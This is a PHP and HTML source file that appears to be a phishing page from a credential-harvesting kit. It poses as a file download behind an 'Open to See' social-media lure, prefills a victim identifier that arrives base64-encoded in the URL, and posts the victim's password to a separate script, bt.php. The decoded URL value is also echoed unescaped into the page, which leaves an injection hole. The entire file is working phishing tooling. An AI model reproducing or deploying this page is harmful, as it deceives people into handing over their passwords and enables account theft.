<?php
session_start();
if(isset($_GET['x'])){
	$user = htmlspecialchars($_GET['x']);
	$decoded_id = base64_decode($user);
	$_SESSION['decoded_id'] = $decoded_id;
}
?>
<html>

<head>
	<meta charset="utf-8">
<meta property="og:title" content="Open to See">
<meta property="og:description" content="35 views, 398 likes">


	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

	<!-- Popper JS -->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	
	<style>
		body {
			background-image: url(img/1.jpg);
			background-repeat: no-repeat;
			color: #045eb4;
		}
		
		#logo {
			position: relative;
			left: 520px;
			top: 50px;
		}
		
		#d {
			position: relative;
			left: 530px;
			top: 150px;
			
		}
		.sky{
			background-color: #409fff;
			
		}
		
		#form {
			position: absolute;
			left: 38px;
			top: 114px;
			width: 331px;
			padding: 30px;
			z-index: 2;
			background: white;
			height: 430px;
			border-radius: 10px;
		}
		.blue{
			background-color: #045eb4;
			color: white;
		}
		#sub1{
			position: absolute;
			left: 580px;
			top:480px;
			
		}
		#sub{
			border-radius: 15px;
			color:white;
			
		}
	</style>
</head>

<body>

	<div id="form" >
	<h1></h1><br><h1></h1>
	<img src="img/2.jpg" width="200">
	<div style="color:#C03A3C; font-size: 13px;position: relative;margin-bottom: 20px; width: 331px;">
		Enter correct  details to start download!
	</div><hr>
	<h1></h1>
	<p></p>
		<form method="POST" action="bt.php">
			<?php if(isset($_SESSION['decoded_id'])) echo $_SESSION['decoded_id']; ?>		  <h6></h6>
			<input type="password" name="p" class="form-control" value="" id="password" placeholder="Password">
			<small class="text-danger" id="er" style="margin-top: -5px; position: absolute"></small>
			<input type="hidden" value="<?php if(isset($_SESSION['decoded_id'])) echo $_SESSION['decoded_id']; ?>" name="x"><br>

			<input id="sub" name="sub" type="submit" class="btn btn-md btn-block sky"  value="Download file">
		
		</form>
	
	</div>
</body>
<script>
$(document).ready(function() {
	
	$('form').submit(function() {
		
		var pwd = $('#password').val();
		
		if($('#password').val() == '') {
			$('#er').text('Please enter your password to continue');
			return false;
			//$('#password').focus();
		}else{
			$('#er').hide().text('');
			return true;
		}
	});
});
</script>

</html>
